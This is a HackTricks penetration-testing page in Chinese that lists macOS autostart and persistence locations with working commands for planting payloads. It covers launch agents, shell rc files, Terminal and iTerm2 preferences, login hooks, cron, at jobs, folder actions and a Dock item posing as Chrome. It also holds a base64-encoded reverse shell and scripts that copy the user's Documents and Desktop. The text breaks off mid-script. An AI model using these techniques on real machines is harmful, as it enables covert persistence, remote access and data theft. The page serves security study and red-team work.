# macOS自动启动

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks云 ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 推特 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 YouTube 🎥</strong></a></summary>

* 你在一家**网络安全公司**工作吗？你想在HackTricks中看到你的**公司广告**吗？或者你想获得**PEASS的最新版本或下载PDF格式的HackTricks**吗？请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 发现我们的独家[**NFTs**](https://opensea.io/collection/the-peass-family)收藏品[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* **加入**[**💬**](https://emojipedia.org/speech-balloon/) [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**。**
* **通过向**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **和**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **提交PR来分享你的黑客技巧。**

</details>

本节内容主要基于博客系列[**超越传统的LaunchAgents**](https://theevilbit.github.io/beyond/)，目标是添加更多的**自动启动位置**（如果可能的话），指出哪些技术在最新版本的macOS（13.4）上仍然有效，并指定所需的**权限**。

## 沙盒绕过

{% hint style="success" %}
在这里，你可以找到用于**绕过沙盒**的启动位置，通过**将其写入文件**并**等待**一个非常**常见的操作**、一段**时间**或通常可以在沙盒内执行而不需要root权限的**操作**来简单地执行某些操作。
{% endhint %}

### Launchd

* 用于绕过沙盒：[✅](https://emojipedia.org/check-mark-button)

#### 位置

* **`/Library/LaunchAgents`**
* **触发器**：重启
* 需要Root权限
* **`/Library/LaunchDaemons`**
* **触发器**：重启
* 需要Root权限
* **`/System/Library/LaunchAgents`**
* **触发器**：重启
* 需要Root权限
* **`/System/Library/LaunchDaemons`**
* **触发器**：重启
* 需要Root权限
* **`~/Library/LaunchAgents`**
* **触发器**：重新登录
* **`~/Library/LaunchDemons`**
* **触发器**：重新登录

#### 描述和利用

**`launchd`**是在启动时由OS X内核执行的**第一个进程**，也是在关机时最后一个完成的进程。它应该始终具有**PID 1**。此进程将**读取和执行**在以下位置指定的**ASEP** **plists**中的配置：

* `/Library/LaunchAgents`：由管理员安装的每个用户代理
* `/Library/LaunchDaemons`：由管理员安装的系统级守护程序
* `/System/Library/LaunchAgents`：由Apple提供的每个用户代理。
* `/System/Library/LaunchDaemons`：由Apple提供的系统级守护程序。

当用户登录时，位于`/Users/$USER/Library/LaunchAgents`和`/Users/$USER/Library/LaunchDemons`的plists将以**登录用户的权限**启动。

**代理和守护程序的主要区别在于代理在用户登录时加载，而守护程序在系统启动时加载**（因为有一些服务（如ssh）需要在任何用户访问系统之前执行）。此外，代理可以使用GUI，而守护程序需要在后台运行。
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.apple.someidentifier</string>
<key>ProgramArguments</key>
<array>
<string>bash -c 'touch /tmp/launched'</string> <!--Prog to execute-->
</array>
<key>RunAtLoad</key><true/> <!--Execute at system startup-->
<key>StartInterval</key>
<integer>800</integer> <!--Execute each 800s-->
<key>KeepAlive</key>
<dict>
<key>SuccessfulExit</key></false> <!--Re-execute if exit unsuccessful-->
<!--If previous is true, then re-execute in successful exit-->
</dict>
</dict>
</plist>
```
有些情况下，需要在用户登录之前执行代理程序，这些被称为**PreLoginAgents**。例如，这在登录时提供辅助技术时非常有用。它们也可以在`/Library/LaunchAgents`中找到（参见[**这里**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents)的示例）。

{% hint style="info" %}
新的守护程序或代理程序配置文件将在下次重启后加载，或使用`launchctl load <target.plist>`命令加载。也可以使用`launchctl -F <file>`加载没有扩展名的.plist文件（但这些plist文件在重启后不会自动加载）。
还可以使用`launchctl unload <target.plist>`命令卸载（指向它的进程将被终止）。

为了确保没有任何东西（如覆盖）阻止代理程序或守护程序运行，请运行：`sudo launchctl load -w /System/Library/LaunchDaemos/com.apple.smdb.plist`
{% endhint %}

列出当前用户加载的所有代理程序和守护程序：
```bash
launchctl list
```
### shell启动文件

写作：[https://theevilbit.github.io/beyond/beyond\_0001/](https://theevilbit.github.io/beyond/beyond\_0001/)\
写作（xterm）：[https://theevilbit.github.io/beyond/beyond\_0018/](https://theevilbit.github.io/beyond/beyond\_0018/)

* 用于绕过沙盒的有用方法：[✅](https://emojipedia.org/check-mark-button)

#### 位置

* **`~/.zshrc`, `~/.zlogin`, `~/.zshenv`, `~/.zprofile`**
* **触发条件**：使用zsh打开终端
* **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
* **触发条件**：使用zsh打开终端
* 需要root权限
* **`~/.zlogout`**
* **触发条件**：使用zsh退出终端
* **`/etc/zlogout`**
* **触发条件**：使用zsh退出终端
* 需要root权限
* 可能还有其他位置：**`man zsh`**
* **`~/.bashrc`**
* **触发条件**：使用bash打开终端
* `/etc/profile`（未生效）
* `~/.profile`（未生效）
* `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
* **触发条件**：预期与xterm一起触发，但**未安装**，即使安装后也会出现以下错误：xterm: `DISPLAY is not set`

#### 描述和利用

当我们的shell环境（如`zsh`或`bash`）**启动**时，会执行shell启动文件。现在，macOS默认使用`/bin/zsh`，每当我们打开`Terminal`或通过SSH连接到设备时，我们都会进入这个shell环境。`bash`和`sh`仍然可用，但必须明确启动。

我们可以使用**`man zsh`**阅读zsh的man页面，其中有关于启动文件的详细描述。
```bash
# Example executino via ~/.zshrc
echo "touch /tmp/hacktricks" >> ~/.zshrc
```
### 重新打开的应用程序

{% hint style="danger" %}
配置指定的利用方式并注销、登录或者重新启动并不能让我执行该应用程序。（该应用程序没有被执行，可能需要在执行这些操作时保持运行状态）
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0021/](https://theevilbit.github.io/beyond/beyond\_0021/)

* 有用于绕过沙盒的方法：[✅](https://emojipedia.org/check-mark-button)

#### 位置

* **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
* **触发条件**：重新启动时重新打开应用程序

#### 描述和利用方式

所有要重新打开的应用程序都在 plist 文件 `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist` 中。

因此，要让重新打开的应用程序启动你自己的应用程序，你只需要**将你的应用程序添加到列表中**。

可以通过列出该目录或使用 `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'` 命令来找到 UUID。

要检查将要重新打开的应用程序，可以执行以下操作：
```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
要将应用程序添加到此列表中，您可以使用以下方法：
```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
-c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
-c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
-c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
-c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```
### 终端偏好设置

* 用于绕过沙盒的有用设置：[✅](https://emojipedia.org/check-mark-button)

#### 位置

* **`~/Library/Preferences/com.apple.Terminal.plist`**
* **触发条件**：打开终端

#### 描述和利用

在**`~/Library/Preferences`**中存储了用户在应用程序中的偏好设置。其中一些偏好设置可以包含配置以**执行其他应用程序/脚本**。

例如，终端可以在启动时执行一个命令：

<figure><img src="../.gitbook/assets/image (676).png" alt="" width="495"><figcaption></figcaption></figure>

这个配置会在文件**`~/Library/Preferences/com.apple.Terminal.plist`**中反映出来，如下所示：
```bash
[...]
"Window Settings" => {
"Basic" => {
"CommandString" => "touch /tmp/terminal_pwn"
"Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
"FontAntialias" => 1
"FontWidthSpacing" => 1.004032258064516
"name" => "Basic"
"ProfileCurrentVersion" => 2.07
"RunCommandAsShell" => 0
"type" => "Window Settings"
}
[...]
```
所以，如果系统中终端的偏好设置的plist文件可以被覆盖，那么可以使用`open`功能来打开终端并执行该命令。

您可以通过命令行添加此功能：

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```
{% endcode %}

### 终端脚本

* 用于绕过沙盒的有用工具：[✅](https://emojipedia.org/check-mark-button)

#### 位置

* **任何地方**
* **触发器**：打开终端

#### 描述和利用

如果你创建一个[**`.terminal`**脚本](https://stackoverflow.com/questions/32086004/how-to-use-the-default-terminal-settings-when-opening-a-terminal-file-osx)并打开它，**终端应用程序**将自动调用执行其中指定的命令。如果终端应用程序具有某些特殊权限（如TCC），你的命令将以这些特殊权限运行。

尝试一下：
```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CommandString</key>
<string>mkdir /tmp/Documents; cp -r ~/Documents /tmp/Documents;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# Use something like the following for a reverse shell:
<string>echo -n "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYxOw==" | base64 -d | bash;</string>
```
{% hint style="danger" %}
如果终端具有**完全磁盘访问权限**，它将能够完成该操作（请注意，执行的命令将在终端窗口中可见）。
{% endhint %}

### 音频插件

Writeup: [https://theevilbit.github.io/beyond/beyond\_0013/](https://theevilbit.github.io/beyond/beyond\_0013/)\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)

#### 位置

* **`/Library/Audio/Plug-Ins/HAL`**
* 需要 root 权限
* **触发条件**：重新启动 coreaudiod 或计算机
* **`/Library/Audio/Plug-ins/Components`**
* 需要 root 权限
* **触发条件**：重新启动 coreaudiod 或计算机
* **`~/Library/Audio/Plug-ins/Components`**
* **触发条件**：重新启动 coreaudiod 或计算机
* **`/System/Library/Components`**
* 需要 root 权限
* **触发条件**：重新启动 coreaudiod 或计算机

#### 描述

根据之前的写作，可以**编译一些音频插件**并加载它们。

### QuickLook 插件

Writeup: [https://theevilbit.github.io/beyond/beyond\_0028/](https://theevilbit.github.io/beyond/beyond\_0028/)

* 用于绕过沙盒的有用工具：[✅](https://emojipedia.org/check-mark-button)

#### 位置

* `/System/Library/QuickLook`
* `/Library/QuickLook`
* `~/Library/QuickLook`
* `/Applications/AppNameHere/Contents/Library/QuickLook/`
* `~/Applications/AppNameHere/Contents/Library/QuickLook/`

#### 描述和利用

当你**触发文件的预览**（在 Finder 中选择文件后按下空格键）并且安装了支持该文件类型的**插件**时，可以执行 QuickLook 插件。

可以编译自己的 QuickLook 插件，将其放置在上述位置之一以加载它，然后转到支持的文件并按下空格键以触发它。

### ~~登录/注销钩子~~

{% hint style="danger" %}
对我来说这行不通，无论是使用用户 LoginHook 还是 root LogoutHook
{% endhint %}

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0022/](https://theevilbit.github.io/beyond/beyond\_0022/)

用于绕过沙盒的有用工具：[✅](https://emojipedia.org/check-mark-button)

#### 位置

* 您需要能够执行类似 `defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh` 的命令
* 位于 `~/Library/Preferences/com.apple.loginwindow.plist`

它们已被弃用，但可用于在用户登录时执行命令。
```bash
cat > $HOME/hook.sh << EOF
#!/bin/bash
echo 'My is: \`id\`' > /tmp/login_id.txt
EOF
chmod +x $HOME/hook.sh
defaults write com.apple.loginwindow LoginHook /Users/$USER/hook.sh
defaults write com.apple.loginwindow LogoutHook /Users/$USER/hook.sh
```
这个设置存储在 `/Users/$USER/Library/Preferences/com.apple.loginwindow.plist` 文件中。
```bash
defaults read /Users/$USER/Library/Preferences/com.apple.loginwindow.plist
{
LoginHook = "/Users/username/hook.sh";
LogoutHook = "/Users/username/hook.sh";
MiniBuddyLaunch = 0;
TALLogoutReason = "Shut Down";
TALLogoutSavesState = 0;
oneTimeSSMigrationComplete = 1;
}
```
要删除它：
```bash
defaults delete com.apple.loginwindow LoginHook
defaults delete com.apple.loginwindow LogoutHook
```
root用户的启动位置存储在**`/private/var/root/Library/Preferences/com.apple.loginwindow.plist`**

## 条件沙盒绕过

{% hint style="success" %}
在这里，您可以找到用于**绕过沙盒**的启动位置，它允许您通过**将其写入文件**并**期望不常见的条件**，如特定的**已安装程序、"不常见"的用户**操作或环境来执行某些操作。
{% endhint %}

### Cron

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0004/](https://theevilbit.github.io/beyond/beyond\_0004/)

* 用于绕过沙盒的有用性: [✅](https://emojipedia.org/check-mark-button)
* 但是，您需要能够执行`crontab`二进制文件
* 或者是root用户

#### 位置

* **`/usr/lib/cron/tabs/`, `/private/var/at/tabs`, `/private/var/at/jobs`, `/etc/periodic/`**
* 直接写入访问需要root权限。如果您可以执行`crontab <file>`，则不需要root权限
* **触发器**: 取决于cron作业

#### 描述和利用

使用以下命令列出**当前用户**的cron作业:
```bash
crontab -l
```
您还可以在**`/usr/lib/cron/tabs/`**和**`/var/at/tabs/`**（需要root权限）中查看用户的所有cron作业。

在MacOS中，可以找到以**特定频率**执行脚本的几个文件夹：
```bash
# The one with the cron jobs is /usr/lib/cron/tabs/
ls -lR /usr/lib/cron/tabs/ /private/var/at/jobs /etc/periodic/
```
在这里，您可以找到常规的cron作业、at作业（不常用）和周期性作业（主要用于清理临时文件）。例如，可以使用`periodic daily`来执行每日周期性作业。

要以编程方式添加用户cron作业，可以使用：
```bash
echo '* * * * * /bin/bash -c "touch /tmp/cron3"' > /tmp/cron
crontab /tmp/cron
```
### iTerm2

Writeup: [https://theevilbit.github.io/beyond/beyond\_0002/](https://theevilbit.github.io/beyond/beyond\_0002/)

* 用于绕过沙盒的有用工具：[✅](https://emojipedia.org/check-mark-button)

#### 位置

* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`**
* **触发条件**: 打开 iTerm
* **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`**
* **触发条件**: 打开 iTerm
* **`~/Library/Preferences/com.googlecode.iterm2.plist`**
* **触发条件**: 打开 iTerm

#### 描述与利用

存储在 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch`** 中的脚本将被执行。例如：
```bash
cat > "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh" << EOF
#!/bin/bash
touch /tmp/iterm2-autolaunch
EOF

chmod +x "$HOME/Library/Application Support/iTerm2/Scripts/AutoLaunch/a.sh"
```
脚本 **`~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt`** 也将被执行：
```bash
do shell script "touch /tmp/iterm2-autolaunchscpt"
```
iTerm2偏好设置位于**`~/Library/Preferences/com.googlecode.iterm2.plist`**，可以在iTerm2终端打开时**指示要执行的命令**。

可以在iTerm2设置中配置此设置：

<figure><img src="../.gitbook/assets/image (2).png" alt="" width="563"><figcaption></figcaption></figure>

命令会反映在偏好设置中：
```bash
plutil -p com.googlecode.iterm2.plist
{
[...]
"New Bookmarks" => [
0 => {
[...]
"Initial Text" => "touch /tmp/iterm-start-command"
```
您可以使用以下命令设置要执行的命令：

{% code overflow="wrap" %}
```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" 'touch /tmp/iterm-start-command'" $HOME/Library/Preferences/com.googlecode.iterm2.plist

# Call iTerm
open /Applications/iTerm.app/Contents/MacOS/iTerm2

# Remove
/usr/libexec/PlistBuddy -c "Set :\"New Bookmarks\":0:\"Initial Text\" ''" $HOME/Library/Preferences/com.googlecode.iterm2.plist
```
{% endcode %}

{% hint style="warning" %}
很有可能有其他方法可以滥用iTerm2的偏好设置来执行任意命令。
{% endhint %}

### xbar

Writeup: [https://theevilbit.github.io/beyond/beyond\_0007/](https://theevilbit.github.io/beyond/beyond\_0007/)

* 有用于绕过沙盒的功能：[✅](https://emojipedia.org/check-mark-button)
* 但需要安装xbar

#### 位置

* **`~/Library/Application\ Support/xbar/plugins/`**
* **触发器**：一旦执行xbar

### Hammerspoon

**Writeup**: [https://theevilbit.github.io/beyond/beyond\_0008/](https://theevilbit.github.io/beyond/beyond\_0008/)

有用于绕过沙盒的功能：[✅](https://emojipedia.org/check-mark-button)

* 但需要安装Hammerspoon

#### 位置

* **`~/.hammerspoon/init.lua`**
* **触发器**：一旦执行hammerspoon

#### 描述

[**Hammerspoon**](https://github.com/Hammerspoon/hammerspoon) 是一款自动化工具，允许通过LUA脚本语言进行macOS脚本编写。我们甚至可以嵌入完整的AppleScript代码以及运行shell脚本。

该应用程序寻找一个名为`~/.hammerspoon/init.lua`的单个文件，并在启动时执行该脚本。
```bash
cat > "$HOME/.hammerspoon/init.lua" << EOF
hs.execute("id > /tmp/hs.txt")
EOF
```
### SSHRC

写作：[https://theevilbit.github.io/beyond/beyond\_0006/](https://theevilbit.github.io/beyond/beyond\_0006/)

* 用于绕过沙盒的有用工具：[✅](https://emojipedia.org/check-mark-button)
* 但需要启用和使用ssh

#### 位置

* **`~/.ssh/rc`**
* **触发条件**：通过ssh登录
* **`/etc/ssh/sshrc`**
* 需要root权限
* **触发条件**：通过ssh登录

#### 描述和利用

默认情况下，除非在`/etc/ssh/sshd_config`中设置了`PermitUserRC no`，当用户通过SSH登录时，脚本`/etc/ssh/sshrc`和`~/.ssh/rc`将被执行。

#### 描述

如果安装了流行的程序[**xbar**](https://github.com/matryer/xbar)，可以在**`~/Library/Application\ Support/xbar/plugins/`**中编写一个shell脚本，当xbar启动时将被执行：
```bash
cat > "$HOME/Library/Application Support/xbar/plugins/a.sh" << EOF
#!/bin/bash
touch /tmp/xbar
EOF
chmod +x "$HOME/Library/Application Support/xbar/plugins/a.sh"
```
### **登录项**

写作：[https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* 用于绕过沙盒的有用工具：[✅](https://emojipedia.org/check-mark-button)
* 但需要使用参数执行 `osascript`

#### 位置

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **触发器：** 登录
* 利用负载存储调用 **`osascript`**
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **触发器：** 登录
* 需要 root 权限

#### 描述

在系统偏好设置 -> 用户与群组 -> **登录项** 中，您可以找到用户登录时要执行的**项目**。\
可以通过命令行列出、添加和删除它们：
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
这些项目存储在文件**`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**中。

**登录项**也可以使用API [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc)来指示，在**`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**中存储配置。

### 将ZIP文件作为登录项

（查看有关登录项的上一节，这是一个扩展）

如果将**ZIP**文件存储为**登录项**，则**`Archive Utility`**将打开它，如果ZIP文件例如存储在**`~/Library`**中，并且包含文件夹**`LaunchAgents/file.plist`**，其中包含一个后门，该文件夹将被创建（默认情况下不会创建），并且plist将被添加，因此下次用户再次登录时，将执行plist中指定的**后门**。

另一个选项是在用户主目录中创建文件**`.bash_profile`**和**`.zshenv`**，因此如果LaunchAgents文件夹已经存在，此技术仍将起作用。

### At

写作：[https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

#### 位置

* 需要**执行** **`at`** 并且必须**启用**

#### **描述**

“At tasks”用于**在特定时间安排任务**。\
这些任务与cron不同，它们是**一次性任务**，在执行后被删除。但是，它们将**在系统重启后保留**，因此不能将其排除为潜在威胁。

默认情况下，它们是**禁用的**，但**root**用户可以使用以下命令**启用**它们：
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
这将在1小时内创建一个文件：
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
使用 `atq` 命令来检查作业队列：
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
上面我们可以看到两个已计划的任务。我们可以使用 `at -c JOBNUMBER` 命令打印任务的详细信息。
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
如果未启用 AT 任务，则创建的任务将不会被执行。
{% endhint %}

**作业文件**可以在 `/private/var/at/jobs/` 找到。
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
文件名包含队列、作业编号和计划运行时间。例如，让我们看看`a0001a019bdcd2`。

* `a` - 这是队列
* `0001a` - 十六进制的作业编号，`0x1a = 26`
* `019bdcd2` - 十六进制的时间。它表示自纪元以来经过的分钟数。`0x019bdcd2`在十进制中是`26991826`。如果我们将其乘以60，我们得到`1619509560`，即`GMT: 2021年4月27日，星期二7:46:00`。

如果我们打印作业文件，我们会发现它包含了我们使用`at -c`得到的相同信息。

### 文件夹操作

Writeup: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* 用于绕过沙箱：[✅](https://emojipedia.org/check-mark-button)
* 但您需要能够使用参数调用osascript并能够配置文件夹操作

#### 位置

* **`/Library/Scripts/Folder Action Scripts`**
* 需要root权限
* **触发器**：访问指定的文件夹
* **`~/Library/Scripts/Folder Action Scripts`**
* **触发器**：访问指定的文件夹

#### 描述和利用

当附加了文件夹操作的文件夹添加或删除项目，或者打开、关闭、移动或调整其窗口时，将执行文件夹操作脚本：

* 通过Finder UI打开文件夹
* 向文件夹添加文件（可以通过拖放或甚至在终端的shell提示符中完成）
* 从文件夹中删除文件（可以通过拖放或甚至在终端的shell提示符中完成）
* 通过UI导航离开文件夹

有几种实现方式：

1. 使用[Automator](https://support.apple.com/guide/automator/welcome/mac)程序创建一个文件夹操作工作流文件（.workflow）并将其安装为服务。
2. 右键单击文件夹，选择“文件夹操作设置...”，“运行服务”，并手动附加脚本。
3. 使用OSAScript向`System Events.app`发送Apple Event消息，以编程方式查询和注册新的“文件夹操作”。

* 这是使用OSAScript发送Apple Event消息到`System Events.app`实现持久性的方法

将执行以下脚本：

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

使用以下命令编译：`osacompile -l JavaScript -o folder.scpt source.js`

然后执行以下脚本以启用文件夹操作，并将先前编译的脚本附加到文件夹 **`/users/username/Desktop`**：
```javascript
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
使用以下命令执行脚本：`osascript -l JavaScript /Users/username/attach.scpt`



* 这是通过GUI实现持久性的方法：

将执行以下脚本：

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

使用以下命令进行编译：`osacompile -l JavaScript -o folder.scpt source.js`

将其移动到：
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
然后，打开`Folder Actions Setup`应用程序，选择**要监视的文件夹**，并在您的情况下选择**`folder.scpt`**（在我的情况下，我称其为output2.scp）：

<figure><img src="../.gitbook/assets/image (2) (1).png" alt="" width="297"><figcaption></figcaption></figure>

现在，如果您使用**Finder**打开该文件夹，您的脚本将被执行。

此配置存储在以base64格式存储的**plist**中，位于**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**中。

现在，让我们尝试在没有GUI访问权限的情况下准备此持久性：

1. **将`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**复制到`/tmp`进行备份：
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. **删除**您刚刚设置的文件夹操作：

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

现在，我们有了一个空的环境

3. 复制备份文件：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. 打开Folder Actions Setup.app以使用此配置：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
对我来说，这没有起作用，但这是写作的说明：(
{% endhint %}

### Spotlight Importers

写作：[https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* 用于绕过沙箱：[🟠](https://emojipedia.org/large-orange-circle)
* 但您将进入一个新的沙箱

#### 位置

* **`/Library/Spotlight`**&#x20;
* **`~/Library/Spotlight`**

#### 描述

您最终将进入一个**严格的沙箱**，因此您可能不想使用此技术。

### Dock快捷方式

写作：[https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* 用于绕过沙箱：[✅](https://emojipedia.org/check-mark-button)
* 但您需要在系统中安装一个恶意应用程序

#### 位置

* `~/Library/Preferences/com.apple.dock.plist`
* **触发器**：当用户单击Dock中的应用程序时

#### 描述和利用

出现在Dock中的所有应用程序都在plist文件中指定：**`~/Library/Preferences/com.apple.dock.plist`**

只需使用以下命令即可**添加一个应用程序**：

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

通过一些**社交工程**技巧，你可以在dock中冒充谷歌浏览器，并实际执行你自己的脚本：
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
